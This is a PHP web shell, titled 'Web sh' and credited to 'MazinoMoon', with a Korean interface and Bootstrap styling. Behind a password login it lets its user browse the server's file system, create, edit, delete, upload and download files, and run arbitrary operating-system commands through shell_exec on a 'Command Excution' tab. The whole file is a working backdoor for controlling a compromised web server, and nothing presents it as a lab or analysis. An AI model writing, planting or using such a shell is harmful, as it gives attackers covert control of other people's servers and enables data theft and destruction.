<?php
session_start();
header('Content-Type: text/html; charset=UTF-8');
$mode = $_REQUEST["mode"];
$path = $_REQUEST["path"];
$page = basename($_SERVER["PHP_SELF"]);
$fileName = $_GET["fileName"];
$inputPw = $_POST["inputPw"];
$accessPw = "e36208f0215f4dae4951568f958d3e80";
$accessFlag = $_SESSION["accessFlag"];

if($accessFlag == "Y"){

if(empty($path)){
$tempFileName = basename(__FILE__);
$tempPath = realpath(__FILE__);
$path = str_replace($tempFileName,"",$tempPath);
$path = str_replace("\\","/",$path);
}else{
$path = realpath($path)."/";
$path = str_replace("\\","/",$path);
}
#Mode Logic
if($mode == "fileCreate"){
if(empty($fileName)){
    echo "파일명이 입력되지 않았습니다.";
    exit();
}
$fp = fopen($path.$fileName,"w");
fclose($fp);
echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
}else if($mode == "dirCreate"){
    if(empty($fileName)){
        echo "디렉터리명이 입력되지 않았습니다.";
        exit();
    }
$dirPath = $path.$fileName;
if(is_dir($dirPath)){
    echo "해당디렉터리명이 존재합니다.";
    exit();
}
mkdir($dirPath);
echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
}else if($mode == "fileModify" && !empty($_POST["fileContents"])){
    $filePath = $path.$fileName;
    if(!file_exists){
        echo "파일이 존재하지 않습니다";
        exit();
    }

    $fileContents = $_POST["fileContents"];
    $fp = fopen($filePath,"w");
    fputs($fp,$fileContents,strlen($fileContents));
    fclose($fp);
echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
}else if($mode == "fileDelete"){
if(empty($fileName)){
    echo "파일명이 입력되지 않았습니다.";
    exit();
}
$filePath = $path.$fileName;
if(!file_exists($filePath)){
    echo "파일이 존재하지 않습니다.";
    exit();
}
if(!unlink($filePath)){
    echo "파일 삭제 실패";
    exit();
}
echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";

}else if($mode == "dirDelete"){
    if(empty($fileName)){
        echo "디렉터리명이 입력되지 않았습니다.";
        exit();
    }
    $dirPath = $path.$fileName;
    if(!is_dir($dirPath)){
        echo "디렉터리가 존재하지 않습니다.";
        exit();
    }
    if(!rmdir($dirPath)){
        echo "디렉토리 실패";
        exit();
    }
    echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
}else if($mode == "fileDownload"){
    if(empty($fileName)){
        echo "파일명이 입력되지 않았습니다.";
        exit();
    }
    $filePath = $path.$fileName;
    if(!file_exists($filePath)){
        echo "파일이 존재하지 않습니다.";
        exit();
    }

    header("Content-Type: application/octet-stream");
    header("Content-Disposition: aatachment; fileName=\"{$fileName}\"");
    header("Content-Transfer-Encoding: binary");
    readfile($filePath);
    exit();
    
}else if($mode == "fileUpload" && !empty($_FILES["file"]["tmp_name"])){
    $filePath = $path.$_FILES["file"]["name"];
    if(!move_uploaded_file($_FILES['file']['tmp_name'],$filePath)){
        echo "파일 업로드에 실패하였습니다.";
exit();
    }
    echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
}else if($mode == "logout"){
    unset($_SESSION["accessFlag"]);
    session_destroy();
    echo "<script>location.href='{$page}'</script>";
    exit();
}
}else{

if($mode=="login" && ($accessPw == md5($inputPw))){
    $_SESSION["accessFlag"] = "Y";
    echo "<script>location.href='{$page}';</script>";
    exit();
}

}
#dir list return func
function getDirList($getPath){
    $listArr =array();
    $handler = opendir($getPath);
    while($file = readdir($handler)){
        if(is_dir($getPath.$file) == "1"){
            $listArr[] = $file;
        }
    }
    closedir($handler);
    return $listArr;
}
#file list return function
function getFileList($getPath){
    $listArr =array();
    $handler = opendir($getPath);
    while($file = readdir($handler)){
        if(is_dir($getPath.$file) != "1"){
            $listArr[] = $file;
        }
    }
    closedir($handler);
    return $listArr;
}
?>
<!DOCTYPE html>
<html lang="ko">
    <head>
        <title>mazino-moon</title>
        <link
            rel="stylesheet"
            href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
        <link
            rel="stylesheet"
            href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">
        <script
            src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
        <script>
            function fileCreate() {
                var fileName = frm.createFileName.value;
                if (!fileName) {
                    alert("파일명을 입력하세요.");
                    return;
                }
                location.href = "<?=$page?>?mode=fileCreate&path=<?=$path?>&fileName=" +
                        fileName;
            }
            function dirCreate() {
                var fileName = frm.createFileName.value;
                if (!fileName) {
                    alert("디렉터리명을 입력하세요.");
                    return;
                }
                location.href = "<?=$page?>?mode=dirCreate&path=<?=$path?>&fileName=" +
                        fileName;
            }
            function fileModify(fileName) {
                location.href = "<?=$page?>?mode=fileModify&path=<?=$path?>&fileName=" +
                        fileName;
            }
            function dirDelete(fileName) {
                if (confirm(fileName + "디렉터리를을 삭제 하시겠습니까?") == true) {
                    location.href = "<?=$page?>?mode=dirDelete&path=<?=$path?>&fileName=" +
                            fileName;
                }
            }
            function fileDelete(fileName) {
                if (confirm(fileName + "파일을 삭제 하시겠습니까?") == true) {
                    location.href = "<?=$page?>?mode=fileDelete&path=<?=$path?>&fileName=" +
                            fileName;
                }
            }
            function fileDownload(fileName) {
                if (confirm(fileName + "파일 다운로드 하시겠습니까?") == true) {
                    location.href = "<?=$page?>?mode=fileDownload&path=<?=$path?>&fileName=" +
                            fileName;
                }
            }
        </script>
    </heade>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-3"></div>
                <div class="col-md-6">
                    <?php if($accessFlag != "Y"){ ?>
                        <h3>Login
                    </h3>
                    <hr>
                        <form action="<?=$page?>?mode=login" method="POST">
                        <div class="input-group">
                            <span class="input-group-addon">PW</span>
                            <input type="text" class="form-control" placeholder="PW Input..." name="inputPw">
                        </div>
                        <br>
                        <p class="text-center">
                            <button class="btn btn-default" type="submit">Auth</button>
                        </p>
                    </form>
                    <?php }else{?>
                    <h3>Web sh
                        <small>Create by MazinoMoon</small>
                    </h3>
                    <hr>
                    <ul class="nav nav-tabs">
                        <li
                            role="presentation"
                            <?php if(empty($mode) || $mode == "fileBrowser") echo "class=\"active\"";?>>
                            <a href="<?=$page?>?mode=fileBrowser">File Browser</a>
                        </li>

                        <li
                            role="presentation"
                            <?php if($mode == "fileUpload") echo "class=\"active\"";?>>
                            <a href="<?=$page?>?mode=fileUpload&path=<?=$path?>">File Upload</a>
                        <li>
                        <li >
                            <a href="<?=$page?>?mode=command">Command Excution</a>
                        <li>
                        <li >
                            <a href="<?=$page?>?mode=logout">Logout</a>
                        <li>
                    </ul>
                    <br>

                    <?php if(empty($mode)||$mode=="fileBrowser") {?>
                    <form action="<?=$page?>?mode=fileBrowser" method="GET">
                        <div class="input-group">
                            <span class="input-group-addon">Current Path</span>
                            <input
                                type="text"
                                class="form-control"
                                placeholder="Path Input..."
                                name="path"
                                value="<?=$path?>">
                            <span class="input-group-btn">
                                <button class="btn btn-default" type="submit">MOVE!</button>
                            </span>
                        </div>
                    </form>
                    <hr>
                    <div class="table-responsive">
                        <table
                            class="table table-bordered table-hover"
                            style="table-layout: fixed; word-break: break-all;">
                            <thead>
                                <tr class="active">
                                    <th style="width:50%" class="text-center">Name</th>
                                    <th style="width:14%" class="text-center">Type</th>
                                    <th style="width:18%" class="text-center">Date</th>
                                    <th style="width:18%" class="text-center">Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
$dirList = getDirList($path);
for ($i=count($dirList)-1; $i>-1;$i--) {
    if($dirList[$i]!= "."){
    $dirDate = date("Y-m-d H:i",filemtime($path.$dirList[$i]));
?>
                                <tr >
                                    <td style="vertical-align:middle" class="text-primary">
                                        <span class="glyphicon glyphicon-folder-open" aria-hidden="true">&nbsp;<b>
                                                <a href="<?=$page?>?mode=fileBrowser&path=<?=$path?><?=$dirList[$i]?>"><?=$dirList[$i]?></a>
                                            </b>
                                        </span>
                                    </td>
                                    <td style="vertical-align:middle">
                                        <kbd>Directory<kbd></td>
                                            <td style="vertical-align:middle"><?=$dirDate?></td>
                                            <?php if($dirList[$i] != "..") { ?>
                                            <td style="vertical-align:middle">
                                                <div class="btn-group btn-group-sm" role="group" aria-label="...">
                                                    <button
                                                        type="button"
                                                        class="btn btn-danger"
                                                        title="Directory Delete"
                                                        onclick="dirDelete('<?=$dirList[$i]?>')">
                                                        <span class="glyphicon glyphicon-trash" aria-hidden="true"></span></button>
                                                </div>
                                            </td>
                                            <?php }?>

                                        </tr>
                                        <?php }}?>
                                        <?php
$dirFile = getFileList($path);
for ($i=0; $i<count($dirFile);$i++) {
    $fileDate = date("Y-m-d H:i",filemtime($path.$dirFile[$i]));

?>
                                        <tr >
                                            <td style="vertical-align:middle">
                                                <span class="glyphicon glyphicon-file" aria-hidden="true"><?=$dirFile[$i]?></span></td>
                                            <td style="vertical-align:middle">
                                                <kbd>File<kbd></td>
                                                    <td style="vertical-align:middle"><?=$fileDate?></td>
                                                    <td style="vertical-align:middle">
                                                        <div class="btn-group btn-group-sm" role="group" aria-label="...">
                                                            <button
                                                                type="button"
                                                                class="btn btn-info"
                                                                title="File Download"
                                                                onclick="fileDownload('<?=$dirFile[$i]?>')">
                                                                <span class="glyphicon glyphicon-save" aria-hidden="true"></span></button>
                                                            <button
                                                                type="button"
                                                                class="btn btn-warning"
                                                                title="File Modify"
                                                                onclick="fileModify('<?=$dirFile[$i]?>')">
                                                                <span class="glyphicon glyphicon-wrench" aria-hidden="true"></span></button>
                                                            <button
                                                                type="button"
                                                                class="btn btn-danger"
                                                                title="File Delete"
                                                                onclick="fileDelete('<?=$dirFile[$i]?>')">
                                                                <span class="glyphicon glyphicon-trash" aria-hidden="true"></span></button>
                                                        </div>
                                                    </td>
                                                </tr>
                                                <?php }?>

                                            </tbody>
                                        </table>
                                    </div>
                                    <hr>
                                    <form name="frm">
                                        <div class="input-group">
                                            <input
                                                type="text"
                                                class="form-control"
                                                placeholder="File/Directory Name Input"
                                                name="createFileName">
                                            <span class="input-group-btn">
                                                <button class="btn btn-default" type="button" onclick="fileCreate()">File Create!</button>
                                                <button class="btn btn-default" type="button" onclick="dirCreate()">Directory Create!</button>
                                            </span>
                                        </div>
                                    </form>
                                <?php }else if($mode == "fileModify"){?>

                                    <?php 
                                    if(empty($fileName)){
                                            echo "파일명이 존재하지 않습니다.);history.back(-1);</script>";
                                            exit();
                                    }
                                    $filePath = $path.$fileName;
                                    if(!file_exists($filePath)){
                                        echo "파일이 존재하지 않습니다.);history.back(-1);</script>";
                                        exit();
                                }
                                
                                $fp = fopen($filePath,"r");
                                $fileContents = fread($fp,filesize($filePath));
                                fclose($fp);
                                     ?>
                                    <form
                                        action="<?=$page?>?mode=fileModify&path=<?=$path?>&fileName=<?=$fileName?>"
                                        method="POST">
                                        <div class="input-group">
                                            <input type="text" class="form-control" value="<?=$path?><?=$fileName?>">
                                            <span class="input-group-btn">
                                                <button class="btn btn-default" type="submit">Modify!</button>
                                            </span>
                                        </div>
                                        <textarea class="form-control" rows="20" name="fileContents"><?=htmlspecialchars($fileContents)?></textarea>
                                    </form>
                                    <br>
                                    <p class="text-center">
                                        <button class="btn btn-default" type="button" onclick="history.back(-1);">Back!</button>
                                    </p>
                                <?php }else if($mode == "fileUpload"){?>
                                    <form
                                        action="<?=$page?>?mode=fileUpload"
                                        method="POST"
                                        enctype="multipart/form-data">
                                        <div class="input-group">
                                            <span class="input-group-addon">Upload Path</span>
                                            <input
                                                type="text"
                                                class="form-control"
                                                placeholder="Path Input..."
                                                name="path"
                                                value="<?=$path?>">
                                        </div>
                                        <hr>
                                        <div class="form-group">
                                            <label for="exampleInputFile">파일 업로드</label>
                                            <input type="file" id="exampleInputFile" name="file">
                                            <p class="help-block">*위의 경로로 업로드*</p>
                                            <p class="text-center">
                                                <button class="btn btn-default" type="submit">Upload!</button>
                                            </p>
                                        </div>
                                    </form>
                                <?php }else if($mode == "command"){?>
                                    <form action="<?=$page?>?mode=command" method="POST">
                                        <div class="input-group">
                                            <span class="input-group-addon">Command</span>
                                            <input
                                                type="text"
                                                class="form-control"
                                                placeholder="Command Input.."
                                                name="command"
                                                >
                                            <span class="input-group-btn"></span>

                                        </div>
                                        <br>
                                        <p class="text-center">
                                            <button class="btn btn-default" type="submit">Execution!</button>
                                        </p>
                                    </form>
<?php 

if(!empty($_POST['command'])){
    echo "<hr>";
    $result = shell_exec($_POST['command']);
    $result = str_replace("\n","<br>",$result);
    $result = iconv("CP949","UTF-8",$result);
    echo $result;
}
?>
                                    <?php } ?>
                                    <?php } ?>
                                    <hr>
                                    <p class="text-muted text-center">Copyright 2022, MazinoMoon🌙, All rights reserved.</p>
                                </div>
                                <div class="col-md-3"></div>
                            </div>
                        </div>
                    </body>
                </html>